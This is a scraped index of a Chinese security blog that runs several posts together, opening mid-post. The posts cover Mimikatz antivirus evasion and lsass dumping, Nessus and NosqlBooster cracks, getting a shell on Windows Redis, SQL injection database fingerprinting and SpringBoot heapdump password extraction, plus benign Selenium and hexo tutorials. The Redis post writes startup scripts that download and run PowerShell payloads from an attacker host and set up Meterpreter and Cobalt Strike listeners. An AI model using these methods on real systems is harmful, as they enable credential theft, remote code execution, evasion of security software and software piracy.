12345cd C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319msbuild.exe mimikatz.xml 过360，并没有拦截火绒同样没报 姿势五：Jscript的xsl版下载mimikatz.xsl 本地加载 1wmic os get /format:&quot;mimikatz.xsl&quot; 360、火绒都没有拦截 姿势六：导出lsass进程离线读取密码mimikatz+procdump 下载prodump，管理员权限运行 1procdump64.exe -accepteula -ma lsass.exe 1.dmp 也可以在任务管理器中导出文件然后把dmp文件导出到本地使用mimikatz读取密码 1mz64.exe &quot;sekurlsa::minidump 1.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit 这里需要注意的是win10下的密码抓取方式是不太一样的，具体看另一篇文章：Windows10明文密码抓取。而win7下拿到dmp文件后，是直接可以导出读取明文密码的。","link":"/2020/09/19/Mimikatz%E7%BB%95%E8%BF%87%E7%9A%84%E6%96%B9%E5%BC%8F/"},{"title":"Nessus安装教程2020","text":"docker部署（kitematic）推荐docker可视化管理器kitematic https://kitematic.com/ https://github.com/docker/kitematic/releases/tag/v0.17.13（win10下载） 设置user和pass 打开如下图： 没有scan选项，说明没有破解 破解-修改plugin_feed_info.inc12docker container ls #查看docker开启的容器信息docker exec -it your-id bash #进入对应docker的bash界面 123[root@bf7b7a5a98ac /]# find /opt -name plugin_feed_info.inc/opt/nessus/var/nessus/plugin_feed_info.inc/opt/nessus/lib/nessus/plugins/plugin_feed_info.inc 使用vi修改plugin_feed_info.inc为： 123PLUGIN_SET = ``&quot;2020060100358&quot;``;PLUGIN_FEED = ``&quot;ProfessionalFeed (Direct)&quot;``;PLUGIN_FEED_TRANSPORT = ``&quot;Tenable Network Security Lightning&quot;``; 重启docker 更新插件12345#拷贝文件到docker容器中docker cp d:\\BaiduNetdiskDownload\\all-2.0_202010242256.tar.gz 0054:/#更新插件nessuscli update all-2.0_202010242256.tar.gz","link":"/2020/12/27/Nessus%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B2020/"},{"title":"NosqlBooster破解教程","text":"下载nosqlboosterhttps://nosqlbooster.com/downloads https://s3.mongobooster.com/download/releasesv6/nosqlbooster4mongo-6.2.7.exe 直接安装 安装asar任意目录下安装 1npm install asar -g 没安装npm的先去装一下 提取asar进入\\osqlbooster4mongo\\resources C:\\Users%username%\\AppData\\Local\\Programs\\nosqlbooster4mongo\\resources 1asar extract app.asar app 提取asar到app目录下 修改时间限制js文件修改\\app\\shared\\lmCore.js C:\\Users%username%\\AppData\\Local\\Programs\\nosqlbooster4mongo\\resources\\app\\shared\\lmCore.js 搜索days，带有数字的修改为： MAX_TRIAL_DAYS=3000,TRIAL_DAYS=3000 重启打开软件如下：","link":"/2020/12/24/NosqlBooster%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/"},{"title":"Redis在windows环境下Getshell方法小结","text":"0x01 前言Redis未授权访问漏洞很早之前就有了，在实战中如果遇到还是比较幸运的。比如挖到ssrf漏洞，如果内网有个未授权或者弱口令的redis，那么就可以深入的挖掘一下。 Redis如果部署在Linux服务器上还好一些，配合nc可以很方便的就拿到了shell。但是如果部署在Windows环境下就比较鸡肋了，虽是这样说，但是也有一些getshell的办法。 0x02 环境搭建系统环境：Windows Server 2012 Redis下载地址： https://github.com/microsoftarchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi 0x03 靶机设置配置Redis安装完Redis后它的服务就自动启动了，所以需要执行以下几步： 1.先停止Redis服务 redis-server --service-stop 2.更改配置文件 进入Redis的安装目录，然后修改windows.conf文件 第56行注释掉# bind 127.0.0.1，第75行把protected-mode yes改成protected-mode no 这样就可以模拟未授权访问的Redis靶机。 3.卸载Redis服务 redis-server --service-uninstall 4.安装Redis服务 redis-server --service-install redis.windows.conf 5.启动redis redis-server --service-start 端口设置Redis默认端口是6379，所以你需要在windows的防火墙里开放6379端口，或者搭建靶机的时候直接就关闭防火墙。 测试Redis未授权访问我是在Centos7上安装过Redis所以直接拿来用了。 123[root@localhost src]# ./redis-cli -h 192.168.230.134192.168.230.134:6379&gt; pingPONG 配置Windows server 2012测试过程中发现，默认是无法在启动项文件夹写文件的，需要把C:\\Users\\Administrator文件夹的组添加上Everyone并把权限改成完全控制，改完以后再测试就可以了。 123192.168.230.134:6379&gt; config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;OK192.168.230.134:6379&gt; 0x04 几种Getshell方法方法其实挺多的，但是比较鸡肋，都需要目标主机重启才可以实现… 一、利用powershell反弹shell1.用msfvenom生成shell.ps1文件 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -f psh-reflection &gt;shell.ps1 2.把shell.ps1文件复制到/var/www/html/目录下，然后启动apache2 3.用msf进行监听 设置payload的时候注意分清系统是32版本的还是64的。 12345678910msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set lhost 192.168.230.133lhost =&gt; 192.168.230.133msf5 exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.230.133:4444 4.利用Redis写入bat文件到启动项 注意\\r\\n\\r\\n代表换行的意思，因为用redis写的文件会自带一些版本信息，如果不换行可能会导致无法执行。反斜杠\\可以转义你payload中的双引号&quot;。 12345678192.168.230.134:6379&gt; config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;OK192.168.230.134:6379&gt; config set dbfilename shell.batOK192.168.230.134:6379&gt; set x &quot;\\r\\n\\r\\npowershell -windowstyle hidden -exec bypass -c \\&quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.230.133/shell.ps1');xx.ps1\\&quot;\\r\\n\\r\\n&quot;OK192.168.230.134:6379&gt; saveOK 5.重启后得到shell 二、利用mshta.exe到/usr/share/metasploit-framework/modules/exploits/windows目录下创建一个msh_shell.rb文件，复制以下内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpServer def initialize(info = {}) super(update_info(info, 'Name' =&gt; 'Microsoft Office Payload Delivery', 'Description' =&gt; %q{ This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc. }, 'License' =&gt; MSF_LICENSE, 'Arch' =&gt; ARCH_X86, 'Platform' =&gt; 'win', 'Targets' =&gt; [ ['Automatic', {} ], ], 'DefaultTarget' =&gt; 0, )) end def on_request_uri(cli, _request) print_status(&quot;Delivering payload&quot;) p = regenerate_payload(cli) data = Msf::Util::EXE.to_executable_fmt( framework, ARCH_X86, 'win', p.encoded, 'hta-psh', { :arch =&gt; ARCH_X86, :platform =&gt; 'win '} ) send_response(cli, data, 'Content-Type' =&gt; 'application/hta') end def primer url = get_uri print_status(&quot;Place the following DDE in an MS document:&quot;) print_line(&quot;mshta.exe \\&quot;#{url}\\&quot;&quot;) endend 然后在msf里重新加载所有模块：reload_all 找到之后就可以使用了 1234567891011121314151617msf5 exploit(windows/msh_shell) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(windows/msh_shell) &gt; set lhost 192.168.230.133lhost =&gt; 192.168.230.133msf5 exploit(windows/msh_shell) &gt; set uripath shelluripath =&gt; shellmsf5 exploit(windows/msh_shell) &gt; exploitzlib(finalizer): the stream was freed prematurely.[*] Exploit running as background job 0.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.230.133:4444[*] Using URL: http://0.0.0.0:8080/shell[*] Local IP: http://192.168.230.133:8080/shell[*] Server started.[*] Place the following DDE in an MS document:mshta.exe &quot;http://192.168.230.133:8080/shell&quot; 然后利用Redis写入bat文件到启动项 123456789[root@localhost src]# ./redis-cli -h 192.168.230.134192.168.230.134:6379&gt; config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;OK192.168.230.134:6379&gt; config set dbfilename shell.batOK192.168.230.134:6379&gt; set x &quot;\\r\\n\\r\\nmshta http://192.168.230.133:8080/shell\\r\\n\\r\\n&quot;OK192.168.230.134:6379&gt; saveOK 手动重启靶机就可以拿到session了 三、使用Cobalt Strike下载地址就不提供了，我是把Cobalt Strike的服务端脚本放到了kali上运行，然后客户端是在我本机(win10)运行的。 1234root@kali:/tools/cobaltctrike3.13-cracked# ./teamserver 192.168.230.133 233[*] Generating X509 certificate and keystore (for SSL)[+] Team server is up on 50050[*] SHA256 hash of SSL cert is: 56b1896ec2bc1dfaab7445e7b9e63f30ab640e5a6180c2ac41de3d936da6c13b 然后用客户端连接，用户名是msf，密码是233，端口具体看服务端返回的 创建一个listener，payload默认，端口自己设置 生成攻击脚本，注意端口别冲突 最后生成一串payload，用redis写一个bat脚本到启动项，然后等待目标重启即可 123456789[root@localhost src]# ./redis-cli -h 192.168.230.134192.168.230.134:6379&gt; config set dir &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;OK192.168.230.134:6379&gt; config set dbfilename shell.batOK192.168.230.134:6379&gt; set x &quot;\\r\\n\\r\\npowershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring('http://192.168.230.133:80/a'))\\&quot;\\r\\n\\r\\n&quot;OK192.168.230.134:6379&gt; saveOK 手动重启靶机后Cobalt Strike客户端里就看到有主机上线了~ 四、利用web服务如果有Web业务的话，可以结合web业务进行Getshell。也是比较鸡肋，起码网站的根目录你得知道。 123456789[root@localhost src]# ./redis-cli -h 192.168.230.134192.168.230.134:6379&gt; config set dir &quot;C:/phpstudy/WWW&quot;OK192.168.230.134:6379&gt; config set dbfilename phpinfo.phpOK192.168.230.134:6379&gt; set x &quot;\\r\\n\\r\\n&lt;?php phpinfo();?&gt;\\r\\n\\r\\n&quot;OK192.168.230.134:6379&gt; saveOK 0x05 一些思考在真实环境中确实遇到了几个可以访问启动目录的系统，在测试的过程中，如果安装了安全软件也是可以拿到shell的。还有就是不知道如果开了3389端口的情况下，如果直接执行net user test$ xxxxxx /add &amp; net localgroup administrators test$ /add这种命令会怎样？本地靶机测试是可以的。如果遇到server 2003的系统，可以用写MOF的方法拿shell。真实的业务环境还是很复杂，但是方法总比困难多。总结的不是很全面，有哪些老哥有好的思路欢迎一起交流。 0x06 参考链接 https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html https://blog.csdn.net/weixin_33928467/article/details/86254639 本文分享自微信公众号 - 渗透云笔记（shentouyun）","link":"/2020/09/30/Redis%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93/"},{"title":"","text":"判断MySQL数据库1.通过报错信息 you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near ” at line x 2. 通过连接符判断 ‘1’+’1′ = ’11’ (mssql也支持，需要用第二句) concat(‘1′,’1′) = ’11’ ‘adm’ ‘in’ = ‘admin’（空格就等同于+） 3. 通过特有数据表判断 and (select count(*) from information_schema.TABLES)&gt;0 4. 通过length和char函数判断 1同时支持length()和char()。len应该也可以。and len('a')=1 （返回正常，MySQL或mssql） 5. 通过BENCHMARK函数判断 select BENCHMARK(100000,MD5(‘ADMIN’)) 6. 通过@@version和version()判断 1同时支持@@version和version()，如果version()报错就是mssql。 7. 通过注释符/*判断 1如果/**/返回错误，说明不是MySQL。 判断MSSQL数据库1.通过报错信息 Msg 170,level 15, State 1,Line 1 Line 1:Incorrect syntax near ‘foo Msg 105,level 15,state 1,Line 1 Unclose quotation mark before the character string ‘foo 或者： 1Microsoft ODBC Database Engine 错误 2. 通过连接符判断 1'1'+'1' = '11' (MySql也支持） 3. 通过特有数据表判断 1and (select count(*) from sysobjects)&gt;0 （返回正常） and (select count(*) from msysobjects)&gt;0 (返回错误) 4. 通过默认变量SERVERNAME判断 1select @@SERVERNAMW ?id=0/@@SERVERNAME （可能会触发错误报错） 5. 通过len函数判断 and len(‘a’)=1 返回正常，可能是mssql,mysql,db2. 6.通过@@version和version()判断 1@@version不报错，version()报错。 7. 通过substring函数判断 substring(‘abc’,1,1)=a 返回正常，可能是mssql。Oracle只能用substr。 8.通过注释符–判断 1使用--返回正常，说明是mssql或者oracle。 ;-- （返回正常，mssql; 错误，基本就是Access） 9. 通过sysobjects判断 12and (select count(*) from sysobjects)&gt;0 一and (select count(*) from msysobjects)&gt;0 二 先使用如果第一句，没有出错就肯定不是Acess；再看第二句，出错了就是SQL-Server；如果第一句和第二句都出错了，就是Access。Access只能使用盲猜表名和列名。 判断Access数据库1.通过报错信息 1Microsoft JET Database Engine错误 '80040e14' 2. 通过特有数据表判断 and (select count(*) from msysobjects)&gt;0 具体看上面MSSQL的图。 3. 通过len和chr函数判断 1同时支持len()和chr()，且不支持length()和char() 4. 通过注释符;–判断 1使用;--，返回错误，基本可以肯定是Access。 判断Oracle数据库1.通过报错信息判断 ORA-01756:quoted string not properly terminated ORA-00933:SQLcommand not properly ended 2. 通过连接符判断 ‘1’||’1’=’11’ concat(‘1′,’1′)=’11’ 3. 通过特有数据表判断 and (select count(*) from sys.user_tables)&gt;0 4. 通过length函数判断 1可以使用length,不能使用len. len('a')=1 （报错） 通过substr函数判断 1只能使用substr,不能用substring。 其它数据库1可根据使用相应数据库的注入语句一个个测试。如：Postgre的pg_sleep(5), sqlite的sqlite_version()等。 参考文章： https://blog.51cto.com/baiwuya2009/1946358?_adFA0.350332429510239 https://blog.dyboy.cn/websecurity/149.html http://www.51testing.com/html/10/171610-78245.html https://blog.csdn.net/Wu000999/article/details/88987253 https://www.cnblogs.com/Fluorescence-tjy/p/10400588.html http://ggy.816ym.com/2020/04/01/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95(Access%E3%80%81SQLServer)/ https://www.bugfor.com/web/5167.html","link":"/2020/10/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/"},{"title":"Selenium使用教程","text":"Selenium：动态页面模拟点击Selenium Selenium是一个Web的自动化测试工具，最初是为网站自动化测试而开发的，类型像我们玩游戏用的按键精灵，可以按指定的命令自动操作，不同是Selenium 可以直接运行在浏览器上，它支持所有主流的浏览器（包括PhantomJS这些无界面的浏览器）。 Selenium 可以根据我们的指令，让浏览器自动加载页面，获取需要的数据，甚至页面截屏，或者判断网站上某些动作是否发生。 Selenium 自己不带浏览器，不支持浏览器的功能，它需要与第三方浏览器结合在一起才能使用。但是我们有时候需要让它内嵌在代码中运行，所以我们可以用一个叫 PhantomJS 的工具代替真实的浏览器。 可以从 PyPI 网站下载 Selenium库https://pypi.python.org/simple/selenium ，也可以用 第三方管理器 pip用命令安装：pip install selenium Selenium 官方参考文档：http://selenium-python.readthedocs.io/index.html PhantomJS PhantomJS 是一个基于Webkit的“无界面”(headless)浏览器，它会把网站加载到内存并执行页面上的 JavaScript，因为不会展示图形界面，所以运行起来比完整的浏览器要高效。 如果我们把 Selenium 和 PhantomJS 结合在一起，就可以运行一个非常强大的网络爬虫了，这个爬虫可以处理 JavaScrip、Cookie、headers，以及任何我们真实用户需要做的事情。 注意：PhantomJS 只能从它的官方网站http://phantomjs.org/download.html) 下载。 因为 PhantomJS 是一个功能完善(虽然无界面)的浏览器而非一个 Python 库，所以它不需要像 Python 的其他库一样安装，但我们可以通过Selenium调用PhantomJS来直接使用。 PhantomJS 官方参考文档：http://phantomjs.org/documentation Selenium快速入门Selenium 库里有个叫 WebDriver 的 API。WebDriver 有点儿像可以加载网站的浏览器，但是它也可以像 BeautifulSoup 或者其他 Selector 对象一样用来查找页面元素，与页面上的元素进行交互 (发送文本、点击等)，以及执行其他动作来运行网络爬虫。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# IPython2 测试代码 # 导入 webdriverfrom selenium import webdriver # 要想调用键盘按键操作需要引入keys包from selenium.webdriver.common.keys import Keys # 调用环境变量指定的PhantomJS浏览器创建浏览器对象driver = webdriver.PhantomJS() # 如果没有在环境变量指定PhantomJS位置# driver = webdriver.PhantomJS(executable_path=&quot;./phantomjs&quot;)) # get方法会一直等到页面被完全加载，然后才会继续程序，通常测试会在这里选择 time.sleep(2)driver.get(&quot;http://www.baidu.com/&quot;) # 获取页面名为 wrapper的id标签的文本内容data = driver.find_element_by_id(&quot;wrapper&quot;).text # 打印数据内容print data # 打印页面标题 &quot;百度一下，你就知道&quot;print driver.title # 生成当前页面快照并保存driver.save_screenshot(&quot;baidu.png&quot;) # id=&quot;kw&quot;是百度搜索输入框，输入字符串&quot;长城&quot;driver.find_element_by_id(&quot;kw&quot;).send_keys(u&quot;长城&quot;) # id=&quot;su&quot;是百度搜索按钮，click() 是模拟点击driver.find_element_by_id(&quot;su&quot;).click() # 获取新的页面快照driver.save_screenshot(&quot;长城.png&quot;) # 打印网页渲染后的源代码print driver.page_source # 获取当前页面Cookieprint driver.get_cookies() # ctrl+a 全选输入框内容driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.CONTROL,'a') # ctrl+x 剪切输入框内容driver.find_element_by_id(&quot;kw&quot;).send_keys(Keys.CONTROL,'x') # 输入框重新输入内容driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;itcast&quot;) # 模拟Enter回车键driver.find_element_by_id(&quot;su&quot;).send_keys(Keys.RETURN) # 清除输入框内容driver.find_element_by_id(&quot;kw&quot;).clear() # 生成新的页面快照driver.save_screenshot(&quot;itcast.png&quot;) # 获取当前urlprint driver.current_url # 关闭当前页面，如果只有一个页面，会关闭浏览器# driver.close() # 关闭浏览器driver.quit() 页面操作Selenium 的 WebDriver提供了各种方法来寻找元素，假设下面有一个表单输入框： 1&lt;input type=&quot;text&quot; name=&quot;user-name&quot; id=&quot;passwd-id&quot; /&gt; 那么： # 获取id标签值 element = driver.find_element_by_id(“passwd-id”) # 获取name标签值 element = driver.find_element_by_name(“user-name”) # 获取标签名值 element = driver.find_elements_by_tag_name(“input”) # 也可以通过XPath来匹配 element = driver.find_element_by_xpath(“//input[@id=’passwd-id’]”) 定位UI元素 (WebElements)关于元素的选取，有如下的API 单个元素选取 find_element_by_id find_elements_by_name find_elements_by_xpath find_elements_by_link_text find_elements_by_partial_link_text find_elements_by_tag_name find_elements_by_class_name find_elements_by_css_selector 鼠标动作链有些时候，我们需要再页面上模拟一些鼠标操作，比如双击、右击、拖拽甚至按住不动等，我们可以通过导入 ActionChains 类来做到： 示例： 12345678910111213141516171819202122232425262728#导入 ActionChains 类from selenium.webdriver import ActionChains # 鼠标移动到 ac 位置ac = driver.find_element_by_xpath('element')ActionChains(driver).move_to_element(ac).perform() # 在 ac 位置单击ac = driver.find_element_by_xpath(&quot;elementA&quot;)ActionChains(driver).move_to_element(ac).click(ac).perform() # 在 ac 位置双击ac = driver.find_element_by_xpath(&quot;elementB&quot;)ActionChains(driver).move_to_element(ac).double_click(ac).perform() # 在 ac 位置右击ac = driver.find_element_by_xpath(&quot;elementC&quot;)ActionChains(driver).move_to_element(ac).context_click(ac).perform() # 在 ac 位置左键单击hold住ac = driver.find_element_by_xpath('elementF')ActionChains(driver).move_to_element(ac).click_and_hold(ac).perform() # 将 ac1 拖拽到 ac2 位置ac1 = driver.find_element_by_xpath('elementD')ac2 = driver.find_element_by_xpath('elementE')ActionChains(driver).drag_and_drop(ac1, ac2).perform() 填充表单我们已经知道了怎样向文本框中输入文字，但是有时候我们会碰到 标签的下拉框。直接点击下拉框中的选项不一定可行。 1234567&lt;select id=&quot;status&quot; class=&quot;form-control valid&quot; onchange=&quot;&quot; name=&quot;status&quot;&gt; &lt;option value=&quot;&quot;&gt;&lt;/option&gt; &lt;option value=&quot;0&quot;&gt;未审核&lt;/option&gt; &lt;option value=&quot;1&quot;&gt;初审通过&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;复审通过&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;审核不通过&lt;/option&gt;&lt;/select&gt; Selenium专门提供了Select类来处理下拉框。 其实 WebDriver 中提供了一个叫 Select 的方法，可以帮助我们完成这些事情： 12345678910# 导入 Select 类from selenium.webdriver.support.ui import Select # 找到 name 的选项卡select = Select(driver.find_element_by_name('status')) # select.select_by_index(1)select.select_by_value(&quot;0&quot;)select.select_by_visible_text(u&quot;未审核&quot;) 以上是三种选择下拉框的方式，它可以根据索引来选择，可以根据值来选择，可以根据文字来选择。注意： index 索引从 0 开始 value是option标签的一个属性值，并不是显示在下拉框中的值 visible_text是在option标签文本的值，是显示在下拉框的值 全部取消选择怎么办呢？很简单: select.deselect_all() 弹窗处理当你触发了某个事件之后，页面出现了弹窗提示，处理这个提示或者获取提示信息方法如下： 1alert = driver.switch_to_alert() 页面切换一个浏览器肯定会有很多窗口，所以我们肯定要有方法来实现窗口的切换。切换窗口的方法如下： 1driver.switch_to.window(&quot;this is window name&quot;) 也可以使用 window_handles 方法来获取每个窗口的操作对象。例如： 12for handle in driver.window_handles:driver.switch_to_window(handle) 页面前进和后退操作页面的前进和后退功能： 12driver.forward() #前进driver.back() # 后退 Cookies获取页面每个Cookies值，用法如下 12for cookie in driver.get_cookies(): print &quot;%s -&gt; %s&quot; % (cookie['name'], cookie['value']) 删除Cookies，用法如下 12345# By namedriver.delete_cookie(&quot;CookieName&quot;)# alldriver.delete_all_cookies() 页面等待注意：这是非常重要的一部分！！ 现在的网页越来越多采用了 Ajax 技术，这样程序便不能确定何时某个元素完全加载出来了。如果实际页面等待时间过长导致某个dom元素还没出来，但是你的代码直接使用了这个WebElement，那么就会抛出NullPointer的异常。 为了避免这种元素定位困难而且会提高产生 ElementNotVisibleException 的概率。所以 Selenium 提供了两种等待方式，一种是隐式等待，一种是显式等待。 隐式等待是等待特定的时间，显式等待是指定某一条件直到这个条件成立时继续执行。 显式等待显式等待指定某个条件，然后设置最长等待时间。如果在这个时间还没有找到元素，那么便会抛出异常了。 12345678910111213141516from selenium import webdriverfrom selenium.webdriver.common.by import By# WebDriverWait 库，负责循环等待from selenium.webdriver.support.ui import WebDriverWait# expected_conditions 类，负责条件出发from selenium.webdriver.support import expected_conditions as ECdriver = webdriver.Chrome()driver.get(&quot;http://www.xxxxx.com/loading&quot;)try: # 页面一直循环，直到 id=&quot;myDynamicElement&quot; 出现 element = WebDriverWait(driver, 10).until( EC.presence_of_element_located((By.ID, &quot;myDynamicElement&quot;)) )finally: driver.quit() 如果不写参数，程序默认会 0.5s 调用一次来查看元素是否已经生成，如果本来元素就是存在的，那么会立即返回。 下面是一些内置的等待条件，你可以直接调用这些条件，而不用自己写某些等待条件了。 title_is title_contains presence_of_element_located visibility_of_element_located visibility_of presence_of_all_elements_located text_to_be_present_in_element text_to_be_present_in_element_value frame_to_be_available_and_switch_to_it invisibility_of_element_located element_to_be_clickable – it is Displayed and Enabled. staleness_of element_to_be_selected element_located_to_be_selected element_selection_state_to_be element_located_selection_state_to_be alert_is_present 隐式等待隐式等待比较简单，就是简单地设置一个等待时间，单位为秒。 123456789from selenium import webdriverdriver = webdriver.Chrome()driver.implicitly_wait(10) # secondsdriver.get(&quot;http://www.xxxxx.com/loading&quot;)myDynamicElement = driver.find_element_by_id(&quot;myDynamicElement&quot;)当然如果不设置，默认等待时间为0。 动态页面模拟点击12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python# -*- coding:utf-8 -*- # python的测试模块import unittestfrom selenium import webdriverfrom bs4 import BeautifulSoup class douyuSelenium(unittest.TestCase): # 初始化方法 def setUp(self): self.driver = webdriver.PhantomJS() #具体的测试用例方法，一定要以test开头 def testDouyu(self): self.driver.get('http://www.douyu.com/directory/all') while True: # 指定xml解析 soup = BeautifulSoup(driver.page_source, 'xml') # 返回当前页面所有房间标题列表 和 观众人数列表 titles = soup.find_all('h3', {'class': 'ellipsis'}) nums = soup.find_all('span', {'class': 'dy-num fr'}) # 使用zip()函数来可以把列表合并，并创建一个元组对的列表[(1,2), (3,4)] for title, num in zip(nums, titles): print u&quot;观众人数:&quot; + num.get_text().strip(), u&quot;\\t房间标题: &quot; + title.get_text().strip() # page_source.find()未找到内容则返回-1 if driver.page_source.find('shark-pager-disable-next') != -1: break # 模拟下一页点击 self.driver.find_element_by_class_name('shark-pager-next').click() # 退出时的清理方法 def tearDown(self): print '加载完成...' self.driver.quit() if __name__ == &quot;__main__&quot;: unittest.main() 转自：https://blog.csdn.net/fly910905/article/details/83793154","link":"/2021/01/29/Selenium%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"},{"title":"SpringBoot 未授权漏洞利用 提取内存密码","text":"背景Actuator 是 Spring Boot 提供的对应用系统的自省和监控的集成功能，可以查看应用配置的详细信息，例如自动化配置信息、创建的 Spring beans 以及一些环境属性等。 为了保证 actuator 暴露的监控接口的安全性，需要添加安全控制的依赖spring-boot-start-security依赖，访问应用监控端点时，都需要输入验证信息。Security 依赖，可以选择不加，不进行安全管理，但不建议这么做。 访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 ****** 号替换，以达到脱敏的效果。 在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。 利用方法1、访问如下路径如果有数据则说明存在漏洞12345# Spring Boot 1.x版本访问/envhttp://ip:8090/env# Spring Boot 2.x版本访问/actuator/envhttp://ip:8090/actuator/env 2、下载jvm heapdump文件12345# Spring Boot 1.x版本访问/heapdumphttp://ip:8090/heapdump# Spring Boot 2.x版本访问/actuator/heapdumphttp://ip:8090/actuator/heapdump 3、使用Eclipse Memory Analyzer解析内存文件Eclipse Memory Analyzer下载地址https://www.eclipse.org/mat/downloads.php 1select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;)) 使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入 1select * from org.springframework.web.context.support.StandardServletEnvironment 然后点击红色感叹号执行查询。 如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中： 所以也可以用 1select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;)) 来查询。 下图为 spring boot 2.x 版本 heapdump 查询结果，最终结果存储在 java.util.LinkedHashMap$Entry 实例的键值对中： 所以也可以用 1select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;)) 参考 http://www.ityouknow.com/springboot/2018/02/06/spring-boot-actuator.html https://landgrey.me/blog/16/ https://www.onebug.org/websafe/98901.html","link":"/2020/12/24/SpringBoot-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E6%8F%90%E5%8F%96%E5%86%85%E5%AD%98%E5%AF%86%E7%A0%81/"},{"title":"hexo迁移","text":"前提条件1、从官网Git下载git，安装git 2、 下载Node.js，安装Node.js，并配置环境变量 指定根目录 D:\\Program Files\\node-v12.12.0-win-x64 即可 输出npm -v 即完成 3、安装hexo 命令：npm install hexo-cli -g PS：windows终端代理命令 1set http_proxy=http://127.0.0.1:7890 linux终端代理命令 12export ALL_PROXY=socks5://127.0.0.1:1080export https_proxy=http://127.0.0.1:12333 复制原PC的hexo数据12345_config.ymlpackage.jsonscaffolds/source/themes/ 把这些文件复制到新电脑上的新建文件夹里，如：hexo文件夹 （1）讨论下哪些文件是必须拷贝的：首先是之前自己修改的文件，像站点配置_config.yml，theme文件夹里面的主题，以及source里面自己写的博客文件，这些肯定要拷贝的。除此之外，还有三个文件需要有，就是scaffolds文件夹（文章的模板）、package.json（说明使用哪些包）和.gitignore（限定在提交的时候哪些文件可以忽略）。其实，这三个文件不是我们修改的，所以即使丢失了，也没有关系，我们可以建立一个新的文件夹，然后在里面执行hexo init，就会生成这三个文件，我们只需要将它们拷贝过来使用即可。总结：_config.yml，theme/，source/，scaffolds/，package.json，.gitignore，是需要拷贝的。（2）再讨论下哪些文件是不必拷贝的，或者说可以删除的：首先是.git文件，无论是在站点根目录下，还是主题目录下的.git文件，都可以删掉。然后是文件夹node_modules（在用npm install会重新生成），public（这个在用hexo g时会重新生成），.deploy_git文件夹（在使用hexo d时也会重新生成），db.json文件。其实上面这些文件也就是.gitignore文件里面记载的可以忽略的内容。总结：.git/，node_modules/，public/，.deploy_git/，db.json文件需要删除。 PS：慎用hexo init 在git bash中切换目录到新拷贝的文件夹里，使用 npm install 命令，进行模块安装。很明显我们这里没用hexo init初始化，因为有的文件我们已经拷贝生成过来了，所以不必用hexo init去整体初始化，如果不慎在此时用了hexo init，则站点的配置文件_config.yml里面内容会被清空使用默认值，所以这一步一定要慎重，不要用hexo init。 安装其他组件安装其他的一些必要组件，如果在node_modules里面有的，就不要重复安装了：（1）为了使用hexo d来部署到git上，需要安装npm install hexo-deployer-git –save（2）为了建立RSS订阅，需要安装npm install hexo-generator-feed –save（3）为了建立站点地图，需要安装npm install hexo-generator-sitemap –save插件安装后，有的需要对配置文件_config.yml进行配置（4）安装图床管理npm install hexo-asset-image 